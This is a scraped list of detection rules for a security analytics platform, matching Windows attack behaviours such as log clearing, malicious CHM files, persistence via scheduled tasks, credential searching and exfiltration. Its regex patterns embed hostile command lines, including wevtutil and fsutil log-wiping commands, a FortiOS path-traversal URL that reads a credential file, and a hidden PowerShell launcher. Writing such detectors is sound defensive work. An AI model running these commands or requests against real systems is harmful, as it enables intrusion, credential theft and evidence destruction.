<li><a href="#">rule combination_of__wevtutil_and_fsutil_to_avoid_forensics_analysis { meta: author = "Ariel Millahuel" description = "This rule detects the combination of wevtutil and fsutil to avoid forensics analysis License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "test_capabilities, t1358" events: (($selection1.target.process.file.full_path = "wevtutil.exe" or $selection1.target.process.file.full_path = "fsutil.exe") and re.regex($selection1.target.process.command_line, `.* wevtutil cl Setup & wevtutil cl System & wevtutil cl Security & wevtutil cl Application & fsutil usn deletejournal /D %.*% .*`) and ($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1")) condition: $selection1 
<li><a href="#">rule compiled_html_file_detector_sysmon_behavior { meta: author = "Lee Archinal" description = "This content detects the distribution of a compiled html file as detected by Sysmon. License: ." reference = "" version = "0.01" created = "2019/09/16" product = "windows" service = "sysmon" mitre = "execution, t1223" events: (($selection1.metadata.product_event_type = "1" and $selection1.target.process.file.full_path = "C:\\Windows\\hh.exe" and re.regex($selection1.target.process.command_line, `.*.*\.chm`)) or ($selection1.metadata.product_event_type = "13" and $selection1.target.process.file.full_path = "C:\\WINDOWS\\hh.exe")) condition: $selection1 
<li><a href="#">rule control_panel_item_execution_detector_sysmon_behavior { meta: author = "Lee Archinal" description = "This content detects behavior as described on the Mitre Att&ck Matrix Technique 1196 License: ." reference = "" version = "0.01" created = "2019/09/19" product = "windows" service = "sysmon" mitre = "execution, t1196" events: (($selection1.metadata.product_event_type = "1" and ((((($selection1.target.process.file.full_path = "C:\\Windows\\System32\\control.exe" and re.regex($selection1.target.process.command_line, `.*\.cpl`)) or ($selection1.target.process.file.full_path = "C:\\Windows\\System32\\rundll32.exe" and re.regex($selection1.target.process.command_line, `C:\\Windows\\system32\\rundll32\.exe Shell32\.dll,Control_RunDLL .*\.cpl`))) or ($selection1.target.process.file.full_path = "C:\\Windows\\SysWOW64\\rundll32.exe" and re.regex($selection1.target.process.command_line, `C:\\Windows\\SysWOW64\\rundll32\.exe C:\\Windows\\SysWOW64\\shell32\.dll .*\.cpl`))) or ($selection1.src.process.file.full_path = "C:\\Windows\\SysWOW64\\rundll32.exe" and re.regex($selection1.src.process.command_line, `C:\\Windows\\SysWOW64\\rundll\.32\.exe .*\.cpl`))) or ($selection1.src.process.file.full_path = "C:\\Windows\\System32\\rundll32.exe" and re.regex($selection1.src.process.command_line, `C:\\Windows\\System32\\rundll32\.exe Shell32\.dll,Control_RunDLL .*\.cpl`)))) or ($selection1.metadata.product_event_type = "7" and $selection1.target.process.file.full_path = "C:\\Window\\SysWOW64\\rundll32.exe" and re.regex($selection1.target.process.file.full_path, `.*\.cpl`))) condition: $selection1 
<li><a href="#">rule covid19_phishing_campaign_fake_world_health_organization { meta: author = "Emir Erdogan" description = "Coronovirus themed malware is downloaded via fake WHO phsihing email License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "T1129, T1060, T1053, T1059" events: (($selection1.src.process.file.full_path = "C:\\Windows\\system32\\cmd.exe" and (($selection1.target.process.file.full_path = "C:\\Windows\\system32\\findstr.exe" and re.regex($selection1.target.process.command_line, `findstr\.exe \"TVNDRgAAAA\" .*\\AppData\\Local\\Temp\\\\g4ZokyumBB2gDn\.tmp`)) or (re.regex($selection1.target.process.file.full_path, `.*\\AppData\\Local\\Temp\\msoia\.exe`) and re.regex($selection1.target.process.command_line, `.*\\AppData\\Local\\Temp\\\\msoia\.exe -decode .*AppData\\Local\\Temp\\\\cSi1r0uywDNvDu\.tmp .*\\AppData\\Local\\Temp\\\\oGhPGUDC03tURV\.tmp`)))) or (re.regex($selection1.target.process.file.full_path, `.*\\OFFICE12\\Wordcnvpxy\.exe`) and re.regex($selection1.src.process.file.full_path, `.*MSOSTYLE\.exe`))) condition: $selection1 
<li><a href="#">rule covid19_ransomware_detection { meta: author = "Osman Demir" description = "Covid19 Ransomware Detection License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "t1471, impact" events: (($selection.metadata.product_event_type = "1" and re.regex($selection.src.process.file.full_path, `.*\\winword\.exe`) and re.regex($selection.target.process.file.full_path, `.*\\cmd\.exe`) and re.regex($selection.src.process.file.full_path, `.*\\cmd\.exe`) and re.regex($selection.target.process.file.full_path, `.*\\reg\.exe`) and $selection.target.process.command_line = "reg delete \"HKCU\\Software\\Microsoft\\Office\\14.0\\Word\\Resiliency\" /F" and $selection.metadata.product_event_type = "11" and re.regex($selection.target.process.file.full_path, `.*\\winword\.exe`) and re.regex($selection.target.file.full_path, `.*\\AppData\\Local\\Temp\\20200323-sitrep-63-covid-19\.doc`) and $selection.metadata.product_event_type = "3" and $selection.target.process.file.full_path = "C:\\Users\\admin\\AppData\\Local\\svchost.exe") or (($selection.target.file.md5 = "2779863A173FF975148CB3156EE593CB5719A0AB238EA7C9E0B0CA3B5A4A9326" or $selection.target.file.md5 = "62D38F19E67013CE7B2A84CB17362C77E2F13134EE3F8743CBADDE818483E617" or $selection.target.file.md5 = "FA84EE006B205F105DF40DD2ABCF238653F8CEF0" or $selection.target.file.md5 = "994A67D5D6341173AD95BC6F5D795FD0") or $selection.target.ip = "31.170.167.123")) condition: $selection 
<li><a href="#">rule covid19_themed_malware_via_chm_file { meta: author = "Emir Erdogan" description = "rundll32 downloads covid-19 malware over chm file License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "T1059, T1204, T1012" events: (($selection1.target.process.file.full_path = "C:\\Windows\\System32\\cmd.exe" and $selection1.src.process.file.full_path = "C:\\Windows\\hh.exe" and re.regex($selection1.target.process.command_line, `.*for %i in \(.*\.chm\) do \(hh -decompile %temp% %~i\)&&cmd /c %temp%/~tmp6\.cab`)) or ($selection1.src.process.file.full_path = "C:\\Windows\\System32\\cmd.exe" and $selection1.target.process.file.full_path = "C:\\Windows\\hh.exe" and re.regex($selection1.target.process.command_line, `hh -decompile .*COVID-19\.chm.*`))) condition: $selection1 
<li><a href="#">rule crypt32dll_nsa_vulnerability_cve20200601 { meta: author = "Furkan Celik" description = "This rule detect vulnerable CRYPT32.DLL library in your environment. NSA has discovered a critical vulnerability (CVE-2020-0601) affecting Microsoft WindowsÂ® cryptographic functionality. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "security" mitre = "execution, T1022" events: ($selection.metadata.product_event_type = "7" and ($selection.target.file.md5 = "E832E3A58B542E15A169B1545CE82451ACE19BD361FD81764383048528F9B540" or $selection.target.file.md5 = "1676DE3980DF1D78E14B172989916570")) condition: $selection 
<li><a href="#">rule crypto_miner_user_agent { meta: author = "Florian Roth" description = "Detects suspicious user agent strings used by crypto miners in proxy logs License: ." reference = "" version = "0.01" created = "2019/10/21" category = "proxy" events: (re.regex($selection.src.application, `XMRig .*`) or re.regex($selection.src.application, `ccminer.*`)) condition: $selection 
<li><a href="#">rule cve201813379_fortigate_ssl_vpn_arbitrary_file_reading { meta: author = "Sittikorn S" description = "FortiOS system file leak through SSL VPN via specially crafted HTTP resource requests. This exploit read /dev/cmdb/sslvpn_websession file, this file contains login and passwords in (clear/text). This vulnerability affect ( FortiOS 5.6.3 to 5.6.7 and FortiOS 6.0.0 to 6.0.4 ). License: ." reference = "" version = "0.01" created = "2020/11/23" category = "webserver" mitre = "initial_access, t1190, t1212" events: re.regex($selection.target.url, `.*/remote/fgt_lang\?lang=/\.\./\.\./\.\./\.\.//////////dev/cmdb/sslvpn_websession.*`) condition: $selection 
<li><a href="#">rule cve20200688_exchange_exploitation_via_web_log { meta: author = "Florian Roth" description = "Detects the exploitation of Microsoft Exchange vulnerability as described in CVE-2020-0688 License: ." reference = "" version = "0.01" created = "2020/02/29" category = "webserver" mitre = "initial_access, t1190" events: ($selection1.network.http.method = "GET" and (re.regex($selection1.target.url, `.*/ecp/.*`) or re.regex($selection1.target.url, `.*/owa/.*`)) and re.regex($selection1.target.url, `.*__VIEWSTATE=.*`)) condition: $selection1 
<li><a href="#">rule cve20201350_dns_remote_code_exploit_sigred_via_cmdline { meta: author = "SOC Prime Team" description = "Detects exploitation of CVE-2020-1350 (aka SIGRED) using suspicious child processes spawned by the exploitable Windows DNS process. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "privilege_escalation, execution, t1068, t1190" events: (re.regex($dns_parent_process.src.process.file.full_path, `.*\\System32\\dns\.exe`) and not ((re.regex($dns_parent_process.target.process.file.full_path, `.*werfault\.exe`) or re.regex($dns_parent_process.target.process.file.full_path, `.*conhost\.exe`)))) condition: $dns_parent_process 
<li><a href="#">rule cve20201350_sigred__windows_dns_dos_exploit_nslookup_cli { meta: author = "Emir Erdogan" description = "This rule detects CVE-2020-1350 vulneraility by the help of sysmon License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "T1499" events: (re.regex($selection.target.process.file.full_path, `.*/nslookup\.exe`) and re.regex($selection.target.process.command_line, `.*nslookup -type=.*sig.*`)) condition: $selection 
<li><a href="#">rule danabot_trojan_sysmon { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "DanaBot, a stealthy banking Trojan. License: ." reference = "" version = "0.01" created = "2019/01/09" product = "windows" service = "sysmon" mitre = "Execution, t1204" events: ($selection.metadata.product_event_type = "1" and $selection.target.file.md5 = "76A64FD17CD1E7C59B8BDE7AA9209854") condition: $selection 
<li><a href="#">rule darkgate_cryptocurrency_mining_and_ransomware_campaign_sysmon { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "DarkGate Cryptocurrency Mining and Ransomware Campaign Detector. License: ." reference = "" version = "0.01" created = "2018/11/13" product = "windows" service = "sysmon" mitre = "Execution, t1204, Impact, t1486" events: ($selection.metadata.product_event_type = "1" and ($selection.target.file.md5 = "3340013b0f00fe0c9e99411f722f8f3f0baf9ae4f40ac78796a6d4d694b46d7b" or $selection.target.file.md5 = "0c3ef20ede53efbe5eebca50171a589731a17037147102838bdb4a41c33f94e5" or $selection.target.file.md5 = "3340013b0f00fe0c9e99411f722f8f3f0baf9ae4f40ac78796a6d4d694b46d7b" or $selection.target.file.md5 = "0c3ef20ede53efbe5eebca50171a589731a17037147102838bdb4a41c33f94e5" or $selection.target.file.md5 = "52c47a529e4ddd0778dde84b7f54e1aea326d9f8eeb4ba4961a87835a3d29866" or $selection.target.file.md5 = "b0542a719c6b2fc575915e9e4c58920cf999ba5c3f5345617818a9dc14a378b4" or $selection.target.file.md5 = "dadd0ec8806d506137889d7f1595b3b5447c1ea30159432b1952fa9551ecfba5" or $selection.target.file.md5 = "c88eab30fa03c44b567bcb4e659a60ee0fe5d98664816c70e3b6e8d79169cbea" or $selection.target.file.md5 = "2264c2f2c2d5a0d6d62c33cadb848305a8fff81cdd79c4d7560021cfb304a121" or $selection.target.file.md5 = "3c68facf01aede7bcd8c2aea853324a2e6a0ec8b026d95c7f50a46d77334c2d2" or $selection.target.file.md5 = "a146f84a0179124d96a707f192f4c06c07690e745cffaef521fcda9633766a44" or $selection.target.file.md5 = "abc35bb943462312437f0c4275b012e8ec03899ab86d353143d92cbefedd7f9d" or $selection.target.file.md5 = "908f2dfed6c122b46e946fe8839feb9218cb095f180f86c43659448e2f709fc7" or $selection.target.file.md5 = "3491bc6df27858257db26b913da8c35c83a0e48cf80de701a45a30a30544706d")) condition: $selection 
<li><a href="#">rule data_compression_detector_sysmon_behavior { meta: author = "Lee Archinal" description = "This content detects characteristcs of data compression as described by the Mitre Att&ck Framework Technique T1002 License: ." reference = "" version = "0.01" created = "2019/09/20" product = "windows" service = "sysmon" mitre = "execution, t1002" events: ((($selection1.metadata.product_event_type = "11" and re.regex($selection1.target.process.file.full_path, `.*\.powershell\.exe`) and re.regex($selection1.target.file.full_path, `.*\.zip`)) or ($selection1.metadata.product_event_type = "1" and re.regex($selection1.target.process.file.full_path, `.*rar\.exe`) and re.regex($selection1.target.process.command_line, `.*\.rar`))) or ($selection1.metadata.product_event_type = "11" and re.regex($selection1.target.process.file.full_path, `.*rar\.exe`) and re.regex($selection1.target.file.full_path, `.*\.rar`))) condition: $selection1 
<li><a href="#">rule data_exfiltration_attempt_via_bitsadmin { meta: author = "Emir Erdogan" description = "Using bitsadmin to exfiltrate data License: ." reference = "" version = "0.01" created = "2021-03-09" category = "sysmon" product = "windows" mitre = "T1020, T1041, T1011" events: (re.regex($selection.target.process.file.full_path, `.*\\bitsadmin\.exe`) and re.regex($selection.target.process.command_line, `.*bitsadmin\.exe /TRANSFER HelpCenterUpload /UPLOAD /PRIORITY.*`)) condition: $selection 
<li><a href="#">rule data_exfiltration_detection_with_htran { meta: author = "Furkan Celik" description = "Similar to most of cyber espionage groups, APT10 is main goal is to exfiltrate critical data from victim is environment. In order to exfiltrate data from the victim is network segment that is not connected to internet, a bridge tool is needed to redirect ports and connections between two network segments. In this case threat group deployed hTran to achieve the same functionality. Over the past years we observed Chinese threata groups using htran in their attacks against world. This executable file was seen as java.exe on compromised hosts License: ." reference = "" version = "0.01" created = "2020/04/12" product = "windows" service = "security" mitre = "T1041, Exfiltration" events: (re.regex($selection.target.process.command_line, `.*java\.exe %% 1936 0x199c .*java\.exe -ht listenip:8080 -hu username -hp password C&C:443 NULL SID -- 0x0`) and $selection.metadata.product_event_type = "1" and re.regex($selection.target.process.file.full_path, `.*java\.exe`)) condition: $selection 
<li><a href="#">rule data_seondbin_ransomware_detector_sysmon_behavior { meta: author = "Lee Archinal" description = "This content detects charactaristics of a strain of malware that focuses on 1data_seond.bin file License: ." reference = "" version = "0.01" created = "2019/06/13" product = "windows" service = "sysmon" mitre = "Impact, t1486" events: ($selection1.metadata.product_event_type = "1" and $selection1.target.process.file.full_path = "C:\\Windows\\System32\\mshta.exe" and (re.regex($selection1.target.process.command_line, `mshta\.exe \".*\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Info\.hta\" `) or $selection1.target.process.command_line = "mshta.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Info.hta\"") and $selection1.metadata.product_event_type = "11" and ($selection1.target.file.full_path = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Info.hta" or $selection1.target.file.full_path = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\1data_second.bin" or re.regex($selection1.target.file.full_path, `C:\\Users.*\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\1data_second\.bin`) or re.regex($selection1.target.file.full_path, `C:\\Users.*\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Info\.hta`)) and $selection1.metadata.product_event_type = "13" and re.regex($selection1.target.registry.registry_key, `.*\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\1data_second\.bin`) and $selection1.target.registry.registry_value_data = "C:\\Windows\\Ssytem32\\1data_second.bin" and re.regex($selection1.target.registry.registry_key, `.*\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\C:\\Windows\\Ssytem32\\Info\.hta`) and $selection1.target.registry.registry_value_data = "mshta.exe \"C:\\Windows\\System32\\Info.hta\"" and re.regex($selection1.target.registry.registry_key, `.*\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\C:\\Users.*\\AppData\\Roaming\\Info\.hta`) and re.regex($selection1.target.registry.registry_value_data, `mashta\.exe \"C:\\Users.*\\AppData\\Roaming\\Info\.hta\"`)) condition: $selection1 
<li><a href="#">rule default_powersploit_and_empire_schtasks_persistence { meta: author = "Markus Neis, @Karneades" description = "Detects the creation of a schtask via PowerSploit or Empire Default Configuration. License: ." reference = "" version = "0.01" created = "2018/03/06" product = "windows" category = "process_creation" mitre = "execution, persistence, privilege_escalation, t1053, t1086, s0111, g0022, g0060, car.2013-08-001" events: (re.regex($selection.src.process.file.full_path, `.*\\powershell\.exe`) and (re.regex($selection.target.process.command_line, `.*schtasks.*/Create.*/SC .*ONLOGON.*/TN .*Updater.*/TR .*powershell.*`) or re.regex($selection.target.process.command_line, `.*schtasks.*/Create.*/SC .*DAILY.*/TN .*Updater.*/TR .*powershell.*`) or re.regex($selection.target.process.command_line, `.*schtasks.*/Create.*/SC .*ONIDLE.*/TN .*Updater.*/TR .*powershell.*`) or re.regex($selection.target.process.command_line, `.*schtasks.*/Create.*/SC .*Updater.*/TN .*Updater.*/TR .*powershell.*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule default_powersploit_schtasks_persistence { meta: author = "Markus Neis" description = "Detects the creation of a schtask via PowerSploit Default Configuration License: ." reference = "" version = "0.01" created = "2018/03/06" product = "windows" service = "sysmon" mitre = "execution, persistence, privilege_escalation, t1053, t1086, s0111, g0022, g0060" events: (re.regex($selection.src.process.file.full_path, `.*\\Powershell\.exe`) and (re.regex($selection.target.process.command_line, `.*\\schtasks\.exe.*/Create.*/RU.*system.*/SC.*ONLOGON.*`) or re.regex($selection.target.process.command_line, `.*\\schtasks\.exe.*/Create.*/RU.*system.*/SC.*DAILY.*`) or re.regex($selection.target.process.command_line, `.*\\schtasks\.exe.*/Create.*/RU.*system.*/SC.*ONIDLE.*`) or re.regex($selection.target.process.command_line, `.*\\schtasks\.exe.*/Create.*/RU.*system.*/SC.*HOURLY.*`))) condition: $selection 
<li><a href="#">rule detect_cmdexe_obfuscation { meta: author = "Joseph Kamau" description = "This rule detects when cmd.exe has been obfuscated this could indicate possible malicious activity, tools like cobalt strike and metasploit also use the environment variable COMSPEC. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "Windows" mitre = "defense_evasion, t1027" events: ((re.regex($selection_commandline.target.process.command_line, `%COMSPEC:.*`) or re.regex($selection_commandline.target.process.command_line, `%comspec:.*`) or re.regex($selection_commandline.target.process.command_line, `.* %comspec:.*`) or re.regex($selection_commandline.target.process.command_line, `%COMSPEC%.*`) or re.regex($selection_commandline.target.process.command_line, ` .*%COMSPEC%.*`) or re.regex($selection_commandline.target.process.command_line, `%COMSPEC%.*`) or re.regex($selection_commandline.target.process.command_line, `%COMSPEC:.*`) or re.regex($selection_commandline.target.process.command_line, `%comspec:.*`) or re.regex($selection_commandline.target.process.command_line, `%Co^m^S^p^Ec^%.*`) or re.regex($selection_commandline.target.process.command_line, `.* %Co^m^S^p^Ec^%.*`)) or (re.regex($selection_commandline.target.process.command_line, `%Co^m^S^p^Ec^%.*`) or re.regex($selection_commandline.target.process.command_line, `%COMSPEC:.*`) or re.regex($selection_commandline.target.process.command_line, `%comspec:.*`) or re.regex($selection_commandline.target.process.command_line, `%COMSPEC%.*`))) condition: $selection_commandline 
<li><a href="#">rule detect_crackmapexec_mimikatz_module_footprint_on_a_victim_machine { meta: author = "Joseph Kamau" description = "This rule detects crackmapexec Mimikatz module obfuscated powershell activity on a victim endpoint License: ." reference = "" version = "0.01" created = "2021-03-09" product = "Windows" service = "sysmon" mitre = "credential_dumping, t1003, powershell, t1086" events: ((re.regex($selection.target.process.file.full_path, `.*\\powershell\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\cmd\.exe`)) and (re.regex($selection.target.process.command_line, `.*91,78,101,116.*`) or re.regex($selection.target.process.command_line, `.*91t78v101v116.*`) or re.regex($selection.target.process.command_line, `.*91,78@101@116.*`) or re.regex($selection.target.process.command_line, `.*91 ,78 ,101, 116 , 46 , 83.*`))) condition: $selection 
<li><a href="#">rule detect_enumeration_via_wmi { meta: author = "Joseph Kamau" description = "This rule detects when wmic is used to conduct discovery activity on windows operating system.Adversaries use this technique to gather information of the host they have compromised License: ." reference = "" version = "0.01" created = "2021-03-09" product = "Windows" category = "process_creation" mitre = "discovery, t1087, t1135, t1518" events: ((re.regex($selection.target.process.command_line, `.* wmic useraccount get /ALL.*`) or re.regex($selection.target.process.command_line, `.* wmic useraccount list.*`) or re.regex($selection.target.process.command_line, `.* wmic startup list brief.*`) or re.regex($selection.target.process.command_line, `.* wmic share list.*`) or re.regex($selection.target.process.command_line, `.* wmic service get.*`) or re.regex($selection.target.process.command_line, `.* wmic qfe get description,installedOn /format:csv.*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule detect_hawkeye_keylogger_on_your_windows_endpoints { meta: author = "Joseph Kamau" description = "This rule detects hawkeye keylogger variants activity that utilise modules from nirsoft software password recovery tools License: ." reference = "" version = "0.01" created = "2021-03-09" product = "Windows" category = "process_creation" mitre = "t1003, credential access" events: (re.regex($selection.target.process.file.full_path, `.* \\vbc\.exe.*`) and (re.regex($selection.target.process.command_line, `.* /stext.*`) or re.regex($selection.target.process.command_line, `.* /scomma.*`) or re.regex($selection.target.process.command_line, `.*\\AppData\\Local\\Temp\\holdermail\.txt.*`) or re.regex($selection.target.process.command_line, `.*\\AppData\\Local\\Temp\\holderwb\.txt.*`) or re.regex($selection.target.process.command_line, `.*\\Roaming\\pidloc\.txt.*`) or re.regex($selection.target.process.command_line, `.*\\Roaming\\pidloc\.txt.*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule detect_possible_discovery_and_collection_of_files { meta: author = "Joseph Kamau" description = "This rule detects the commands executed to discover certain file types(other file types can be added depending on document formats prevalent in an organization) using powershell and findstr command which could be indicative of discovery and collection stage of data exfiltration License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" category = "process_creation" mitre = "discovery, t1083, collection, t1119" events: (((re.regex($selection.target.process.file.full_path, `.*\\powershell\.exe`) and (re.regex($selection.target.process.command_line, `Get-ChildItem -Recurse -Include .*\.ppt`) or re.regex($selection.target.process.command_line, `Get-ChildItem -Recurse -Include .*\.doc`) or re.regex($selection.target.process.command_line, `Get-ChildItem -Recurse -Include .*\.xls`) or re.regex($selection.target.process.command_line, `Get-ChildItem -Recurse -Include .*\.pptx`) or re.regex($selection.target.process.command_line, `Get-ChildItem -Recurse -Include .*\.docx`) or re.regex($selection.target.process.command_line, `Get-ChildItem -Recurse -Include .*\.xlsx`) or re.regex($selection.target.process.command_line, `Get-ChildItem -Recurse -Include .*\.pdf`) or re.regex($selection.target.process.command_line, `Get-ChildItem -Recurse -Include .*\.csv`) or re.regex($selection.target.process.command_line, `Get-ChildItem -Recurse -Include .*\.mdb`) or re.regex($selection.target.process.command_line, `Get-ChildItem -Recurse -Include .*\.pps`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) or ((re.regex($selection.target.process.command_line, `.* findstr .*`) or re.regex($selection.target.process.command_line, `.* findtsr\.exe`)) and (re.regex($selection.target.process.command_line, `.*\.doc`) or re.regex($selection.target.process.command_line, `.*\.docx`) or re.regex($selection.target.process.command_line, `.*\.pdf`) or re.regex($selection.target.process.command_line, `.*\.xls`) or re.regex($selection.target.process.command_line, `.*\.xlsx`) or re.regex($selection.target.process.command_line, `.*\.csv`) or re.regex($selection.target.process.command_line, `.*\.mdb`) or re.regex($selection.target.process.command_line, `.*\.pps`) or re.regex($selection.target.process.command_line, `.*\.pptx`) or re.regex($selection.target.process.command_line, `.*\.ppt`)))) or (re.regex($selection.target.process.file.full_path, `.*\\findstr\.exe`) and (re.regex($selection.target.process.command_line, `.*\.doc`) or re.regex($selection.target.process.command_line, `.*\.docx`) or re.regex($selection.target.process.command_line, `.*\.xls`) or re.regex($selection.target.process.command_line, `.*\.xlsx`) or re.regex($selection.target.process.command_line, `.*\.ppt`) or re.regex($selection.target.process.command_line, `.*\.pptx`) or re.regex($selection.target.process.command_line, `.*\.pps`) or re.regex($selection.target.process.command_line, `.*\.mdb`) or re.regex($selection.target.process.command_line, `.*\.pdf`) or re.regex($selection.target.process.command_line, `.*\.csv`)))) condition: $selection 
<li><a href="#">rule detect_possible_execution_of_phishing_attachment { meta: author = "Joseph Kamau" description = "This rule detects when a process is created from the execution of a possible malicoius email attachment sent as malspam or spear phishing attempts based on the most prevalent naming techniques and extensions.This rule would be ideal for hunting for phishing attacks that would have gone undetected License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" category = "process_creation" mitre = "initial_access, t1566, t1566.001, t1566.002" events: ((re.regex($selection.target.process.command_line, `.*.*pdf\.exe`) or re.regex($selection.target.process.command_line, `.*.*pdf\.zip`) or re.regex($selection.target.process.command_line, `.*.*pdf\.7zp`) or re.regex($selection.target.process.command_line, `.*\\order.*\.jar`) or re.regex($selection.target.process.command_line, `.*\\payment.*\.jar`) or re.regex($selection.target.process.command_line, `.*\\shipping.*\.exe`) or re.regex($selection.target.process.command_line, `.*\\shipping.*\.jar`) or re.regex($selection.target.process.command_line, `.*\\purchase.*\.jar`) or re.regex($selection.target.process.command_line, `.*.*\.arj`) or re.regex($selection.target.process.command_line, `.*.*\.xz`) or re.regex($selection.target.process.command_line, `.*.*pdf\.gz`) or re.regex($selection.target.process.command_line, `.*\\quotation.*\.jar`) or re.regex($selection.target.process.command_line, `.*\\order.*\.zip`) or re.regex($selection.target.process.command_line, `.*.*xls\.zip`) or re.regex($selection.target.process.command_line, `.*\\swift.*\.jar`) or re.regex($selection.target.process.command_line, `.*\\invoice.*\.jar`) or re.regex($selection.target.process.command_line, `.*\\invoice.*\.exe`) or re.regex($selection.target.process.command_line, `.*\\shipping advice.*\.exe`) or re.regex($selection.target.process.command_line, `.*\\shipping advice.*\.jar`) or re.regex($selection.target.process.command_line, `.*\\Airway bill.*\.exe`) or re.regex($selection.target.process.command_line, `.*\\Airway bill.*\.jar`) or re.regex($selection.target.process.command_line, `.*\\DHL.*\.exe`) or re.regex($selection.target.process.command_line, `.*\\Corona.*\.exe`) or re.regex($selection.target.process.command_line, `.*\\Covid.*\.exe`) or re.regex($selection.target.process.command_line, `.*\\corona.*\.doc`) or re.regex($selection.target.process.command_line, `.*\\covid.*\.doc`) or re.regex($selection.target.process.command_line, `.*.*\.bat\.rar`) or re.regex($selection.target.process.command_line, `.*.*\.zip\.xxe`) or re.regex($selection.target.process.command_line, `.*.*\.xlsx\.swf`) or re.regex($selection.target.process.command_line, `.*\\PO`) or re.regex($selection.target.process.command_line, `.*\\Invoice`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule detect_possible_pony_malware { meta: author = "Joseph Kamau" description = "This rule detects a subset of user agents used by pony malware License: ." reference = "" version = "0.01" created = "2021-03-09" product = "proxy" mitre = "command and control, t1071" events: (($selection.src.application = "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98)" or $selection.src.application = "pony" or $selection.src.application = "zapoy") and re.regex($selection.target.url, `.*/gate/php`)) condition: $selection 
<li><a href="#">rule detect_rogue_servicesexe_process { meta: author = "Joseph Kamau" description = "This rule detects an anomaly whereby services.exe is not a child process of wininit.exe this could be indicative of a rogue services.exe process. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "process_creation" mitre = "defense_evasion, t1036" events: (re.regex($selection.target.process.file.full_path, `.*\\services\.exe`) and not ($selection.src.process.file.full_path = "C:\\Windows\\System32\\wininit.exe")) condition: $selection 
<li><a href="#">rule detect_search_for_credentials_on_windows_operating_system { meta: author = "Joseph Kamau" description = "This rule detects the search for keywords that define passwords or administrative accounts using the findstr command in Windows Operating system License: ." reference = "" version = "0.01" created = "2021-03-09" product = "Windows" category = "process_creation" mitre = "discovery, t1083, collection, t1119" events: ((re.regex($selection_1.target.process.command_line, ` .*password.*`) or re.regex($selection_1.target.process.command_line, ` .*admin.*`) or re.regex($selection_1.target.process.command_line, ` .*passwd.*`) or re.regex($selection_1.target.process.command_line, ` .*pass.*`)) and re.regex($selection_1.target.process.file.full_path, `.*\\findstr\.exe`)) condition: $selection_1 
<li><a href="#">rule detect_service_creation_by_metasploit_on_victim_machine { meta: author = "Joseph Kamau" description = "This rule detects when a service is created by metasploit(e.g psexec) via powershell on a victim endpoint License: ." reference = "" version = "0.01" created = "2021-03-09" product = "Windows" service = "security" mitre = "execution, powershell, t1086" events: ($selection.metadata.product_event_type = "7045" and re.regex($selection.target.process.command_line, `%COMSPEC% /b /c start /b /min powershell\.exe -nop -w hidden -noni -c.*`)) condition: $selection 
<li><a href="#">rule detect_when_a_process_tries_to_allow_execution_of_malicious_email_attachments { meta: author = "Joseph Kamau" description = "This rule detects when a process tries to access the Windows attachment manager, this could be an attempt to allow the execution of malicious files types in email attachments License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "process_creation" mitre = "defense_evasion, attck.t1112" events: re.regex($selection.target.process.command_line, `.*\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Attachments`) condition: $selection 
<li><a href="#">rule detect_when_the_guest_account_is_enabled { meta: author = "Joseph Kamau" description = "This rule detects when the guest account in windows Operating system is enabled, its best practise to disable the account since it has no password.Attempts to enable it should be investigated License: ." reference = "" version = "0.01" created = "2021-03-09" product = "Windows" service = "security" mitre = "defense_evasion, t1078" events: ($selection.metadata.product_event_type = "4722" and ($selection.src.user.user_display_name = "guest" or $selection.src.user.user_display_name = "Guest")) condition: $selection 
<li><a href="#">rule detect_windows_password_policy_changes { meta: author = "Joseph Kamau" description = "This rule detetcs when Windows password policy is changed, most organizations have a prescribed password policy changes to global or individual endpoints password policy should be traeted with suspicion License: ." reference = "" version = "0.01" created = "2021-03-09" product = "Windows" service = "security" mitre = "defense_evasion, t1484" events: ($selection.metadata.product_event_type = "643" or $selection.metadata.product_event_type = "4739") condition: $selection 
